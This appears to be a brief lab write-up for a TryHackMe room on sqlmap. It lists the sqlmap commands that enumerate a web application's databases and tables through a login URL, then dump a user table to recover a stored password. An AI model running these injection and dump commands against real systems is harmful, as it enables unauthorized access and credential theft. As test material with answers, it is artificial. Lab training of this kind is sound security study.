# [SQLMap: The Basics](https://tryhackme.com/r/room/sqlmapthebasics)

## Task 4 Practical Exercise

```shell
export MACHINE_IP=x.x.x.x
```

**How many databases are available in this web application?**

```shell
sqlmap -u "http://$MACHINE_IP/ai/includes/user_login?email=test&password=test" --dbs --level=5
```

**What is the name of the table available in the "ai" database?**

```shell
sqlmap -u "http://$MACHINE_IP/ai/includes/user_login?email=test&password=test" -D ai --tables --level=5
```

**What is the password of the email test@chatai.com?**

```shell
sqlmap -u "http://$MACHINE_IP/ai/includes/user_login?email=test&password=test" -D ai -T user --dump
```
